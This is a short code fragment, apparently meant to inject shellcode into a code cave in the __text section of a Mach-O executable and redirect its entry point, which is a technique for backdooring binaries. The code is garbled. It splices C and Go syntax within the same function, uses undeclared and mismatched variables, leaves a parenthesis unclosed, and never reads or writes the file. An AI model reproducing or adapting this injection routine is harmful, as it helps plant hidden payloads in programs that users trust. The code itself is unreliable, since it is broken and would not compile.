int binject_MACH-O(char *file,char *shellcode)
{
   uint32_t size;
   FILE *f;
  f=fopen(file,"r");
  fseek(f,0,SEEK_END);
   size=ftell(f);
   char *file_buffer = calloc(1,size);
	shellcodefixed = ApplySuffixJmpIntel64(shellcodeBytes, uint32(caveOffset), uint32(machoFile.EntryPoint), machoFile.ByteOrder)
				scfixedlen=strlen(shellcodefixed);
    for(i=0;i<sections;i++)
  {
     
                       for _, section := range machoFile.Sections {
		if (strstr(section.SectionHeader.Seg,"__TEXT") && strstr(section.Name,"__text")) {
			caveOffset= 0x20;
			caveOffset+=machoFile.FileHeader.Cmdsz
			
			
			if(scfixedlen<section.Offset-caveOffset)
			{
				memcpy(buf+cave_offset,shellcodefixed,strlen(shellcodefixed);
			break;
				       }
		}
	}
 
  }
                        
  free(file_buffer);
}
